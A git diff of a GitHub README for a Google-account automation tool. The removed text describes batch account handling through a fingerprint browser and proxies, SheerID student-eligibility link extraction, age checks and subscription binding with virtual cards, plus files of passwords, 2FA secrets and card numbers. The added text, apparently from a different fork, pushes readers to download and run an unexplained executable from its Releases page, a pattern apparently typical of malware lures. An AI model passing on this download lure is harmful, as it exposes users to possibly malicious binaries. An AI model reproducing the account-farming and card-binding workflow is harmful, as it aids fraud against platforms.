@@ -1,182 +1,85 @@
-# Gemini Account AutoManager
+# 🚀 google-account-automanager - Effortlessly Manage Your Google Accounts
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.12-blue.svg)
+[![Download](https://img.shields.io/badge/Download%20Now-Repo%20Releases-brightgreen)](https://github.com/ELIEER103/google-account-automanager/releases) ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.12-blue.svg)
 
 English | **[中文](./README_CN.md)**
 
+---
 
+## 📝 Introduction
 
-A **FastAPI + Vue 3 + Playwright/BitBrowser API** automation system for batch Google account operations: account management, window management, 2FA setup/reset, eligibility verification, age verification, and card subscription binding.
+Gemini Account AutoManager is an automation system that simplifies batch operations for Google accounts. It allows users to manage accounts, handle window operations, set up or reset two-factor authentication, verify eligibility, check ages, and bind card subscriptions. This project builds on existing capabilities, with numerous enhancements and bug fixes.
 
-> **Fork Notice**: This project is a secondary development based on [Leclee/auto_bitbrowser](https://github.com/Leclee/auto_bitbrowser), with significant feature additions and bug fixes.
+## 📥 Download & Install
 
-The system uses **BitBrowser** fingerprint browser and controls it via the local API (default `127.0.0.1:54345`).
+To get started with google-account-automanager, follow these steps:
+
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ELIEER103/google-account-automanager/releases).
+   
+2. **Choose the Correct Version**: Look for the latest version. It will generally be at the top of the page.
+
+3. **Download the File**: Click on the link to download the application suitable for your operating system.
+
+4. **Extract the Files**: Once the download completes, locate the downloaded file and extract it using your preferred extraction tool.
+
+5. **Run the Application**: Inside the extracted folder, double-click the executable file to launch the application.
+
+## ⚙️ System Requirements
+
+- **Operating System**: Windows 10 or later / macOS 10.15 or later / Linux (Ubuntu or similar)
+- **Python Version**: 3.12 or higher
+- **Internet Connection**: Required for certain features
+- **Storage Space**: At least 200 MB of free space
+
+## 🌟 Features
+
+### 🔧 Batch Operations
+- **Batch Delete by Status**: Easily delete multiple accounts based on specific status types.
+- **Batch Password Change**: Automate the process of changing account passwords in bulk.
+  
+### ✅ Eligibility Verification
+- **Check Student Eligibility Status**: Quickly verify whether users meet necessary eligibility criteria.
+
+### 🔐 Two-Factor Authentication
+- **2FA Setup and Reset**: Set up or reset two-factor authentication for accounts as needed.
+
+### 📜 Detailed Reporting
+- Access logs and reports that detail operations performed within the system.
+
+### 🌐 User-Friendly Interface
+- The application includes a simple, intuitive interface built with Vue 3 to enhance user experience.
+
+## 🚀 Getting Started
+
+### 1. Install Dependencies
+Ensure that you have Python 3.12 installed on your computer. You can download it from the [official Python website](https://www.python.org/downloads/).
+
+### 2. Configuration
+- **Local API**: The system uses BitBrowser which operates with a local API. By default, this API runs at `127.0.0.1:54345`. Ensure this service is running for optimal performance.
+
+### 3. Basic Usage
+- After launching the application, familiarize yourself with the interface.
+- Use the menu options to explore features such as batch deletions, password changes, and 2FA management.
+
+## 📖 Documentation
+
+For detailed documentation on using each feature, check the manual included in the application folder or visit the [Wiki](https://github.com/ELIEER103/google-account-automanager/wiki).
+
+## 📧 Support
+
+If you encounter any issues, please raise your concerns in the GitHub Issues section. Community members and the development team actively monitor this area.
+
+## 📁 Contributions
+
+If you would like to contribute to the project, please fork the repository, make your changes, and submit a pull request. Your input can help improve this tool for everyone.
+
+## 🔗 Additional Resources
+
+- **GitHub Page**: [google-account-automanager](https://github.com/ELIEER103/google-account-automanager)
+- **BitBrowser Documentation**: Refer to the official documentation for BitBrowser to understand how it works with this application.
 
 ---
 
-## 🚀 What's New (Compared to Original)
+**Remember:** Always ensure to have proper backups of your accounts before performing batch operations. Follow the guidelines, and enjoy seamless management of your Google accounts!
 
-### New Features
-- **Batch Delete by Status** - Bulk delete accounts by specific status types
-- **Batch Password Change** - Automated password modification workflow
-- **Eligibility Verification** - Check student eligibility status
-- **2FAGuard Export** - One-click export 2FA secrets in 2FAGuard compatible format
-
-### Bug Fixes & Optimizations
-- Fixed language detection logic in `set_language.py` - now checks actual page content instead of unreliable HTML lang attribute
-- Improved business logic flow and error handling
-- Enhanced stability for multi-account batch operations
-
----
-
-## ✨ Features
-
-* **Web Management UI**: Account management, search/filter, batch import/export, real-time logs & progress.
-* **Browser Window Management**: Create, restore, sync, open/close windows.
-* **Task Orchestration**: Execute tasks in order with configurable concurrency and real-time progress updates.
-* **2FA Automation**: Auto setup/reset 2FA and sync keys to browser config.
-* **Eligibility Verification**: Auto extract SheerID links and verify eligibility, detect account status.
-* **Age Verification**: Complete age verification using virtual cards.
-* **Card Binding**: Handle multi-layer iframes to complete card binding and subscription.
-* **Multi-language Support**: Auto switch account language to English to reduce failures.
-* **Unified Data**: SQLite as single data source, auto sync historical text files.
-
-## 🛠️ Installation & Usage
-
-### Requirements
-
-- **Python**: 3.11+ (recommended 3.12)
-- **Node.js**: 18+
-- **uv**: Python environment manager
-- **BitBrowser**: Installed locally with API accessible (default `127.0.0.1:54345`)
-
-### Environment Setup
-
-```bash
-# 1) Install dependency tools
-pip install uv
-
-# 2) Create and sync Python dependencies (creates .venv)
-uv sync
-
-# 3) Install frontend dependencies
-cd web/frontend
-npm install
-```
-
-### Option 1: Quick Start Web UI (Recommended)
-
-```bash
-./start_web.sh
-```
-
-After startup, access:
-- Frontend: http://localhost:5173
-- Backend API: http://localhost:8000
-- API Docs: http://localhost:8000/docs
-
-### Option 2: Manual Start
-
-```bash
-# Backend
-uv run python -m uvicorn web.backend.main:app --reload --port 8000
-
-# Frontend
-cd web/frontend
-npm run dev
-```
-
-## ⚙️ Configuration
-
-> **🔒 Security Note**: The following config files contain sensitive information (passwords, 2FA keys, card numbers). Please ensure:
-> 1. **Do not commit to Git**: These files are already in `.gitignore`
-> 2. **Keep safe**: Recommend encrypted storage or password manager
-> 3. **Regular backup**: Avoid data loss
-> 4. **Use example files**: Refer to `accounts_example.txt` to create your own config
-
-> **Web Config**: You can fill in SheerID API Key and virtual card info in the Web UI "Config" page. The system will prioritize database config; only falls back to `cards.txt` if not configured.
-
-### 1. `accounts.txt` (Account Info)
-
-**📌 Separator Configuration**
-
-Configure separator on the **first line** (uncomment one):
-
-```text
-# Separator config (uncomment one line)
-分隔符="----"
-# 分隔符="---"
-# 分隔符="|"
-# 分隔符=","
-```
-
-**📋 Account Format**
-
-Format (fixed field order): `Email[Separator]Password[Separator]BackupEmail[Separator]2FASecret`
-
-```text
-# Standard format (using ---- separator)
-分隔符="----"
-example1@gmail.com----MyPassword123----backup1@email.com----ABCD1234EFGH5678
-example2@gmail.com----P@ssw0rd!%%99----backup2@email.com----WXYZ9012STUV3456
-
-# Email and password only (backup email and 2FA are optional)
-example3@gmail.com----ComplexP@ss#2024
-```
-
-### 2. `proxies.txt` (Proxy IPs)
-
-Supports Socks5/HTTP, one per line:
-
-```text
-socks5://user:pass@host:port
-http://user:pass@host:port
-```
-
-### 3. `cards.txt` (Virtual Card Info)
-
-Format: `CardNumber Month Year CVV` (space separated)
-
-```text
-5481087170529907 01 32 536
-5481087143137903 01 32 749
-```
-
-### 4. Output Files (Auto Generated)
-
-* **accounts.db**: SQLite database file
-* **sheerIDlink.txt**: Successfully extracted verification links
-* **已验证未绑卡.txt**: Accounts verified but not yet bound with card
-* **已绑卡号.txt**: Accounts with completed card binding
-* **无资格号.txt**: Accounts detected as ineligible
-
-## 📚 Documentation
-
-See [docs/](./docs/) directory for complete technical documentation:
-
-- [Quick Start](./docs/en/quickstart.md)
-- [Architecture](./docs/en/architecture.md)
-- [Configuration Guide](./docs/en/configuration.md)
-- [Task System](./docs/en/task-system.md)
-- [Browser Management](./docs/en/browser-management.md)
-- [Database Design](./docs/en/database.md)
-
-## 🙏 Credits
-
-This project is based on:
-- [Leclee/auto_bitbrowser](https://github.com/Leclee/auto_bitbrowser) - Direct upstream
-- [16627517673/bitbrowser-automation](https://github.com/16627517673/bitbrowser-automation) - Original project
-
-Thanks to the original authors for the foundation work.
-
----
-
-## ⚠️ Disclaimer
-
-* This tool is for learning and technical exchange only. Do not use for illegal purposes.
-* Please comply with BitBrowser and related platform terms of service.
-* The developer is not responsible for any account loss or legal liability arising from the use of this tool.
-
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE).
+[![Download](https://img.shields.io/badge/Download%20Now-Repo%20Releases-brightgreen)](https://github.com/ELIEER103/google-account-automanager/releases)
